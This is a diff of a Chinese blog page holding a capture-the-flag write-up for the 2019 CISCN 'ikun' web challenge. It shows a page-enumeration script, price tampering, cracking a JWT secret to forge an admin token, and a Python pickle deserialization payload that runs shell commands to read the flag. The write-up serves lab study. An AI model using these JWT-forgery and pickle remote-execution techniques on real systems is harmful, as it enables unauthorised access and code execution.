@@ -16,12 +16,12 @@
   <meta name="author" content="orange">
   <meta name="keywords" content="">
   
-    <meta name="description" content="题目在线靶场 一个生成的网站，有提示需要买到Lv6，然后就没有然后了 分析下面有很多Lv2-Lv5的，可以尝试写个脚本找到网页 点击图片看名称，src&#x3D;&quot;&#x2F;static&#x2F;img&#x2F;lv&#x2F;lv3.png&quot;写脚本爆一下看看哪页有lv6.png的内容 12345678import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c66eb3e7-b146-49bb-b9c7-e5">
+    <meta name="description" content="题目 在线靶场 一个生成的网站，有提示需要买到Lv6，然后就没有然后了  分析 下面有很多Lv2-Lv5的，可以尝试写个脚本找到网页 点击图片看名称，src&#x3D;&quot;&#x2F;static&#x2F;img&#x2F;lv&#x2F;lv3.png&quot;写脚本爆一下看看哪页有lv6.png的内容 12345678import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c66eb3e7-b146-49bb-b9c">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2019ciscn-ikun">
 <meta property="og:url" content="https://0ran9ewww.github.io/2024/09/04/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2019ciscn-ikun/index.html">
 <meta property="og:site_name" content="0raN9e的笔记">
-<meta property="og:description" content="题目在线靶场 一个生成的网站，有提示需要买到Lv6，然后就没有然后了 分析下面有很多Lv2-Lv5的，可以尝试写个脚本找到网页 点击图片看名称，src&#x3D;&quot;&#x2F;static&#x2F;img&#x2F;lv&#x2F;lv3.png&quot;写脚本爆一下看看哪页有lv6.png的内容 12345678import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c66eb3e7-b146-49bb-b9c7-e5">
+<meta property="og:description" content="题目 在线靶场 一个生成的网站，有提示需要买到Lv6，然后就没有然后了  分析 下面有很多Lv2-Lv5的，可以尝试写个脚本找到网页 点击图片看名称，src&#x3D;&quot;&#x2F;static&#x2F;img&#x2F;lv&#x2F;lv3.png&quot;写脚本爆一下看看哪页有lv6.png的内容 12345678import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;c66eb3e7-b146-49bb-b9c">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04155642.png">
 <meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04160139.png">
@@ -121,7 +121,11 @@
 
 
   
-<meta name="generator" content="Hexo 7.1.1"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
 
 
 <body>
@@ -271,7 +275,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          450 字
+          448 字
         
       </span>
     
@@ -340,33 +344,31 @@
             
               <div class="markdown-body">
                 
-                <h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2]ikun">在线靶场</a></p>
+                <h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2>
+<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web2%5Dikun">在线靶场</a></p>
 <p>一个生成的网站，有提示需要买到Lv6，然后就没有然后了</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>下面有很多Lv2-Lv5的，可以尝试写个脚本找到网页</p>
+<h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2>
+<p>下面有很多Lv2-Lv5的，可以尝试写个脚本找到网页</p>
 <p>点击图片看名称，<code>src=&quot;/static/img/lv/lv3.png&quot;</code>写脚本爆一下看看哪页有lv6.png的内容</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://c66eb3e7-b146-49bb-b9c7-e58d5fef7173.node5.buuoj.cn:81/shop?page=&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">300</span>):<br>    response = requests.get(url+<span class="hljs-built_in">str</span>(i))<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;lv6.png&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(i)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
-
 <p>可以在181页找到内容，这里先常规注册一个账号，给了10price</p>
 <img src="/../../images/每日一题/2024-09-04155642.png" srcset="/img/loading.gif" lazyload alt="2024-09-04155642" style="zoom:50%;">
-
 <p>很明显需要尝试改一下内容，购买的时候抓包一下，把discount改的很小就行</p>
 <p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04160139.png" srcset="/img/loading.gif" lazyload alt="2024-09-04160139"></p>
 <p>然后应该考察的内容是cookie的内容，发现有jwt,用jwt网站看一下内容，修改成admin需要有密钥，用工具可以跑一下</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/brendan-rius/c-jwt-cracker.git<br></code></pre></td></tr></table></figure>
-
 <p>然后根据github上面的要求docker一下就行了，得到了密钥进行修改，将新的jwt修改发包刷新，看到一个压缩包，解压在Admin.py里发现了pickle的moudle,注意到有pickle的利用，在这边进行突破，最后得到flag</p>
-<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>用分析的脚本搜索，进入?page&#x3D;181,然后点击购买就行抓包，利用jwt修改admin，需要爆破密钥</p>
+<h2 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h2>
+<p>用分析的脚本搜索，进入?page=181,然后点击购买就行抓包，利用jwt修改admin，需要爆破密钥</p>
 <p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04161841.png" srcset="/img/loading.gif" lazyload alt="2024-09-04161841"></p>
 <p>得到密钥是1Kun，随后修改得到可用的jwt</p>
 <p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04165203.png" srcset="/img/loading.gif" lazyload alt="2024-09-04165203"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo<br></code></pre></td></tr></table></figure>
-
 <p>修改成为admin,看网页的源码得到下载的<code>www.zip</code>定位到Admin.py里面的pickle,找到关键代码</p>
 <p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04162728.png" srcset="/img/loading.gif" lazyload alt="2024-09-04162728"></p>
 <p>尝试写利用脚本，这里需要注意的是用python2的环境，而且os.system并不会成功打通，可以使用commands进行利用</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> commands<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (commands.getoutput,(<span class="hljs-string">&#x27;ls /&#x27;</span>,))<br><br>orange = exp()<br><br><span class="hljs-built_in">print</span>(urllib.quote(pickle.dumps(orange)))<br></code></pre></td></tr></table></figure>
-
-<p>先ls找到了flag.txt，然后cat &#x2F;flag.txt，就可以得到flag了</p>
+<p>先ls找到了flag.txt，然后cat /flag.txt，就可以得到flag了</p>
 <p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04164924.png" srcset="/img/loading.gif" lazyload alt="2024-09-04164924"></p>
 
                 
@@ -778,6 +780,22 @@
   <noscript>
     <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
   </noscript>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>Copy
 </body>
 </html>
 
